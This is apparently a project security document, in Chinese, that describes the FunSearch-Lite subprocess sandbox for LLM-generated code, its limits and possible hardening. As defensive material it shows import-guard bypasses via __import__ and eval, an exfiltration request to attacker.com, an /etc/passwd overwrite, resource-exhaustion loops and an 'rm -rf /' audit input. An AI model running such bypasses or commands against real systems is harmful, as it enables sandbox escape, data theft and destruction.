# Sandbox Security Model & Limitations

本文档详细说明 FunSearch-Lite 沙箱的安全模型、设计决策、已知限制和适用场景。

## ✅ 当前状态：沙箱已启用

**沙箱功能已在 2025-02 启用并集成到实验流程中。**

| 模式 | 沙箱状态 | 说明 |
|------|----------|------|
| **Demo 模式** (`--demo`) | ❌ 禁用 | 使用 mock LLM，快速测试 |
| **正式实验** | ✅ 启用 | 批量执行模式，安全且高效 |

### 批量执行优化

为了解决每次调用 `score_bin` 都创建子进程带来的性能问题，我们实现了**批量执行模式**：

```
原始方案 (每调用一次创建一次子进程):
  ~2000 次 score_bin 调用 × ~10ms/进程 = 20+ 秒/候选 ❌ 太慢

批量执行方案 (整个评估在一个子进程中完成):
  1 次子进程 × ~3ms = 3ms/候选 ✅ 高效
```

**关键实现**:
- `sandbox/protocol.py`: `batch_child_main()` - 在沙箱内运行完整评估
- `sandbox/executor.py`: `execute_batch()` - 批量执行接口
- `experiments/runner.py`: `SandboxBinPackingEvaluator` - 沙箱评估器

---

## ⚠️ 重要声明

**FunSearch-Lite 的沙箱实现是 BEST-EFFORT, NOT PRODUCTION-GRADE.**

本项目的沙箱设计目标是:
- ✅ 防止常见的意外破坏 (如误删文件)
- ✅ 限制资源消耗 (超时、内存)
- ✅ 阻止明显的不安全操作 (如网络访问)
- ❌ **不保证** 抵御恶意攻击或精心构造的逃逸

**适用场景**:
- ✅ 研究原型
- ✅ 课程项目
- ✅ 可信输入环境 (如自己的 LLM 生成代码)
- ❌ 生产环境
- ❌ 不可信用户输入
- ❌ 高安全要求场景

---

## 1. 沙箱架构

### 1.1 设计原则

```
┌─────────────────────────────────────────────────┐
│           FunSearch Main Process                │
│  (受信任，运行核心搜索逻辑)                        │
└────────────┬────────────────────────────────────┘
             │
             │ subprocess.Popen()
             ▼
┌─────────────────────────────────────────────────┐
│         Isolated Child Process                  │
│  (不受信任，执行 LLM 生成的代码)                   │
│                                                 │
│  限制措施:                                        │
│  ├─ 进程隔离 (独立内存空间)                        │
│  ├─ 超时限制 (signal.alarm)                       │
│  ├─ 内存限制 (resource.setrlimit) [Linux/macOS]  │
│  └─ 导入白名单 (import hook)                      │
└─────────────────────────────────────────────────┘
```

### 1.2 隔离层次

| 层次 | 机制 | 强度 | 平台支持 |
|------|------|------|----------|
| **进程隔离** | subprocess | 中 | All |
| **时间限制** | signal.alarm | 高 | Linux/macOS |
| **内存限制** | resource.setrlimit | 中 | Linux/macOS |
| **导入限制** | Custom import hook | 低 | All |
| **文件系统隔离** | ❌ 未实现 | N/A | N/A |
| **网络隔离** | ❌ 未实现 | N/A | N/A |

---

## 2. 安全措施详解

### 2.1 进程隔离

**实现**: `sandbox/executor.py`

```python
def execute(self, code: str, timeout_seconds: float) -> ExecutionResult:
    """在独立子进程中执行代码"""
    
    # 创建新子进程
    proc = subprocess.Popen(
        [sys.executable, "-c", wrapper_code],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    
    # 等待完成或超时
    try:
        stdout, stderr = proc.communicate(timeout=timeout_seconds)
    except subprocess.TimeoutExpired:
        proc.kill()
        return ExecutionResult(error="Timeout")
```

**防护效果**:
- ✅ 子进程崩溃不影响主进程
- ✅ 内存泄漏限制在子进程
- ✅ 每次执行创建新进程，无状态污染

**无法防御**:
- ❌ 子进程消耗大量 CPU (只能靠超时)
- ❌ 子进程 fork 炸弹 (未限制进程数)
- ❌ 子进程访问文件系统 (共享同一文件系统)

### 2.2 超时限制

**实现**: `sandbox/executor.py`

```python
# 方式 1: subprocess.communicate(timeout=...)
stdout, stderr = proc.communicate(timeout=timeout_seconds)

# 方式 2: signal.alarm() (子进程内部)
import signal

def timeout_handler(signum, frame):
    raise TimeoutError("Execution timeout")

signal.signal(signal.SIGALRM, timeout_handler)
signal.alarm(int(timeout_seconds))
```

**防护效果**:
- ✅ 防止无限循环
- ✅ 防止长时间阻塞操作

**限制**:
- ⚠️ Windows 不支持 `signal.SIGALRM`，仅靠 `proc.communicate(timeout=...)`
- ⚠️ 精度受限于系统调度 (实际超时可能 ±0.1 秒)

### 2.3 内存限制

**实现**: `sandbox/policy.py`

```python
import resource

def set_memory_limit(max_memory_mb: int) -> None:
    """限制子进程最大内存使用"""
    if sys.platform == "win32":
        # Windows 不支持 resource.setrlimit
        return
    
    max_bytes = max_memory_mb * 1024 * 1024
    resource.setrlimit(resource.RLIMIT_AS, (max_bytes, max_bytes))
```

**防护效果**:
- ✅ 防止内存消耗炸弹 (如无限列表增长)
- ✅ 限制堆内存分配

**限制**:
- ❌ Windows 不支持
- ⚠️ macOS 上 `RLIMIT_AS` 行为不一致
- ⚠️ 无法防御 mmap 等绕过方式

### 2.4 导入限制

**实现**: `sandbox/policy.py`

```python
SAFE_MODULES = frozenset([
    # 安全的内置模块
    "math", "random", "itertools", "functools", "collections",
    "heapq", "bisect", "array", "copy", "dataclasses",
    # 不安全的模块被排除: os, sys, subprocess, socket, ...
])

def is_import_allowed(module_name: str) -> bool:
    """检查模块是否在白名单中"""
    top_level = module_name.split(".")[0]
    return top_level in SAFE_MODULES

# 在子进程启动时安装 import hook
class ImportGuard:
    def find_module(self, fullname, path=None):
        if not is_import_allowed(fullname):
            raise ImportError(f"Import of '{fullname}' is not allowed")
        return None

sys.meta_path.insert(0, ImportGuard())
```

**防护效果**:
- ✅ 阻止导入 `os`, `sys`, `subprocess`, `socket` 等危险模块
- ✅ 阻止文件操作 (`open`, `pathlib`)
- ✅ 阻止网络操作 (`urllib`, `requests`)

**无法防御**:
- ❌ 内置函数绕过 (如 `__import__`, `eval`, `exec`)
- ❌ 已导入模块的全局访问 (如 `sys.modules`)
- ❌ C 扩展模块的底层操作

**已知绕过示例**:

```python
# 绕过 1: 使用内置函数
os_module = __import__("os")
os_module.system("echo pwned")

# 绕过 2: 通过 sys.modules
import sys
os_module = sys.modules.get("os")

# 绕过 3: 使用 eval
eval("__import__('os').system('echo pwned')")
```

---

## 3. 已知限制和风险

### 3.1 文件系统访问

**风险**: 子进程可以读写文件系统

**未实施的防护**:
- ❌ chroot/jail
- ❌ 只读文件系统
- ❌ 文件访问白名单

**实际风险**:
```python
# 恶意代码可以:
with open("/etc/passwd", "w") as f:  # 覆盖系统文件 (需要权限)
    f.write("malicious content")

import os
os.remove("important_file.txt")  # 删除文件 (如果能导入 os)
```

**缓解措施**:
- 仅在非特权用户下运行
- 重要文件做好备份
- 不在生产环境使用

### 3.2 网络访问

**风险**: 子进程可以发起网络请求

**未实施的防护**:
- ❌ 网络命名空间隔离
- ❌ 防火墙规则
- ❌ 禁用网络模块

**实际风险**:
```python
# 如果能绕过导入限制:
import urllib.request
urllib.request.urlopen("http://attacker.com/exfiltrate?data=...")
```

**缓解措施**:
- 导入白名单阻止常见网络库
- 在无网络环境运行 (如离线虚拟机)

### 3.3 资源消耗攻击

**风险**: 即使有限制，仍可能消耗大量资源

**示例攻击**:

```python
# CPU 消耗
while True:
    pass  # 会被超时中断

# 内存消耗 (逐步增长)
data = []
while True:
    data.append([0] * 1000)  # 可能在触发内存限制前运行一段时间

# 磁盘消耗
with open("huge_file.txt", "w") as f:
    while True:
        f.write("x" * 1000000)  # 可能填满磁盘
```

**缓解措施**:
- 设置合理的超时 (默认 5 秒)
- 设置内存限制 (默认 512 MB)
- 监控磁盘使用率

### 3.4 平台差异

| 功能 | Linux | macOS | Windows |
|------|-------|-------|---------|
| 进程隔离 | ✅ | ✅ | ✅ |
| 超时限制 (signal) | ✅ | ✅ | ⚠️ 仅 communicate() |
| 内存限制 | ✅ | ⚠️ 不可靠 | ❌ |
| CPU 限制 | ❌ | ❌ | ❌ |
| 文件系统隔离 | ❌ | ❌ | ❌ |

**Windows 特殊说明**:
- `signal.alarm()` 不可用
- `resource.setrlimit()` 不可用
- 仅超时保护生效

---

## 4. 与生产级沙箱的对比

### 4.1 真正的沙箱技术

| 技术 | 隔离级别 | 复杂度 | 示例 |
|------|----------|--------|------|
| **容器 (Docker)** | 高 | 中 | Docker, Podman |
| **虚拟机** | 极高 | 高 | VirtualBox, QEMU |
| **Seccomp** | 高 | 高 | 系统调用过滤 |
| **AppArmor/SELinux** | 高 | 高 | 强制访问控制 |
| **gVisor** | 高 | 高 | 用户态内核 |
| **Pyodide (WASM)** | 高 | 中 | WebAssembly 沙箱 |

### 4.2 FunSearch-Lite vs 生产级沙箱

| 特性 | FunSearch-Lite | Docker | gVisor |
|------|----------------|--------|--------|
| 进程隔离 | ✅ 子进程 | ✅ Namespaces | ✅ 用户态内核 |
| 文件系统隔离 | ❌ | ✅ 只读/覆盖层 | ✅ |
| 网络隔离 | ❌ | ✅ 独立网络栈 | ✅ |
| 系统调用过滤 | ❌ | ✅ Seccomp | ✅ |
| 资源限制 | ⚠️ 部分 | ✅ Cgroups | ✅ |
| 易用性 | ✅ 简单 | ⚠️ 需配置 | ⚠️ 复杂 |
| 性能开销 | 低 | 中 | 高 |

### 4.3 为什么不用 Docker?

**课程项目的权衡**:

| 考虑因素 | 当前实现 (子进程) | Docker 方案 |
|---------|------------------|-------------|
| 学习成本 | 低 (标准库) | 高 (Docker, 镜像构建) |
| 依赖要求 | 无 | 需要 Docker 守护进程 |
| 跨平台性 | 好 (Python 标准库) | 中 (Windows 需 WSL2) |
| 开发速度 | 快 | 慢 (需构建镜像) |
| 安全性 | 低 | 高 |
| 适用场景 | 研究/课程 | 生产 |

**结论**: 对于课程项目，简单的子进程隔离 + 导入限制已足够。

---

## 5. 安全最佳实践

### 5.1 运行环境建议

✅ **推荐做法**:
- 在非特权用户下运行
- 在虚拟机或容器内运行 (额外保护层)
- 定期备份重要文件
- 监控系统资源使用

❌ **不要做**:
- 在 root/admin 账户下运行
- 在包含敏感数据的系统上运行
- 在生产服务器上运行
- 相信沙箱能抵御恶意攻击

### 5.2 配置建议

```yaml
# configs/secure_config.yaml

# 保守的超时设置
timeout_seconds: 5  # 不超过 5 秒

# 限制代数和种群大小 (减少暴露时间)
max_generations: 20
population_size: 30

# 使用可信的 LLM 提供者
llm_providers:
  - provider_id: "trusted_provider"
    provider_type: "openai"  # 相对可信的 API
    # 避免使用本地不可信模型
```

### 5.3 代码审查

在运行实验前，可以审查 LLM 生成的代码:

```python
from sandbox.policy import is_import_allowed
import ast

def audit_code(code: str) -> list[str]:
    """检查代码中的可疑模式"""
    warnings = []
    
    try:
        tree = ast.parse(code)
    except SyntaxError:
        return ["Syntax error"]
    
    for node in ast.walk(tree):
        # 检查导入
        if isinstance(node, ast.Import):
            for alias in node.names:
                if not is_import_allowed(alias.name):
                    warnings.append(f"Disallowed import: {alias.name}")
        
        # 检查危险内置函数
        if isinstance(node, ast.Call):
            if isinstance(node.func, ast.Name):
                if node.func.id in ["eval", "exec", "__import__"]:
                    warnings.append(f"Dangerous builtin: {node.func.id}")
    
    return warnings

# 使用示例
code = """
import os
os.system("rm -rf /")
"""
warnings = audit_code(code)
print(warnings)  # ["Disallowed import: os"]
```

---

## 6. 适用场景矩阵

| 场景 | 适用性 | 说明 |
|------|--------|------|
| 🎓 课程项目 | ✅ 推荐 | 演示概念足够 |
| 🔬 研究原型 | ✅ 推荐 | 快速迭代优先 |
| 👤 个人实验 | ✅ 推荐 | 可信环境 |
| 👥 多用户平台 | ❌ 不推荐 | 需要真正隔离 |
| 🏢 生产环境 | ❌ 禁止 | 安全风险高 |
| ☁️ 云服务 | ❌ 禁止 | 需要容器/VM |
| 🌐 公开 API | ❌ 禁止 | 易被攻击 |

---

## 7. 未来改进方向

如果要将沙箱升级到生产级，可以考虑:

### 7.1 短期改进 (可在项目中实现)

1. **静态代码审查**
   - 使用 AST 分析检测可疑模式
   - 拒绝包含 `eval`, `exec`, `__import__` 的代码

2. **更严格的导入限制**
   - 完全禁用 `__import__`, `importlib`
   - 使用受限的 `globals()` 和 `locals()`

3. **资源监控**
   - 记录每次执行的资源使用
   - 检测异常消耗模式

### 7.2 长期改进 (需要重大架构变更)

1. **Docker 集成**
   ```python
   import docker
   client = docker.from_env()
   container = client.containers.run(
       "python:3.10-alpine",
       command=["python", "-c", code],
       mem_limit="128m",
       network_disabled=True,
       read_only=True,
       remove=True,
   )
   ```

2. **WebAssembly (Pyodide)**
   - 在浏览器沙箱中运行 Python
   - 完全隔离的执行环境

3. **自定义内核 (gVisor)**
   - 用户态内核隔离
   - 系统调用级别过滤

---

## 8. 法律和伦理考虑

### 8.1 责任声明

**使用本项目即表示您理解并同意**:
- 本项目的沙箱 **不保证** 安全性
- 作者 **不承担** 因使用本项目导致的任何损失
- 您 **自行承担** 运行不可信代码的风险

### 8.2 使用建议

- ✅ 在隔离的测试环境中运行
- ✅ 定期备份重要数据
- ✅ 使用版本控制 (git) 跟踪更改
- ✅ 监控异常行为

---

## 9. 测试覆盖

沙箱的安全特性有专门的测试:

```bash
# 运行沙箱安全测试
python3 -m pytest tests/test_sandbox.py -v
```

**测试内容**:
- ✅ 超时限制生效
- ✅ 导入阻止生效
- ✅ 进程隔离 (子进程崩溃不影响主进程)
- ✅ 内存限制 (Linux/macOS)
- ✅ 语法错误捕获

**未测试的风险**:
- ❌ 文件系统破坏
- ❌ 网络渗透
- ❌ 绕过导入限制的高级技巧

---

## 10. 总结

### 安全模型总结

```
FunSearch-Lite Sandbox = 子进程隔离 + 超时 + 内存限制 + 导入白名单

防护级别: ⭐⭐☆☆☆ (2/5 星)

适用于: 课程项目、原型研究、个人实验
不适用于: 生产环境、多用户平台、公开服务
```

### 关键要点

1. **这不是生产级沙箱** - 不要在重要系统上运行
2. **假设代码是可信的** - 适合可信 LLM API 生成的代码
3. **防御意外，不防御恶意** - 能阻止误操作，不能阻止攻击
4. **课程项目已足够** - 对于演示概念和学习目的合适
5. **升级需要重大变更** - 生产级需要 Docker/VM 等技术

### 参考资源

- [Python subprocess 文档](https://docs.python.org/3/library/subprocess.html)
- [Python resource 文档](https://docs.python.org/3/library/resource.html)
- [Docker 安全最佳实践](https://docs.docker.com/engine/security/)
- [gVisor](https://gvisor.dev/) - 生产级沙箱
- [Pyodide](https://pyodide.org/) - WASM Python 沙箱

---

如有安全疑虑或发现漏洞，欢迎提交 Issue 讨论（如果这是开源项目）。

**记住: 在怀疑时，不要运行不可信的代码！**
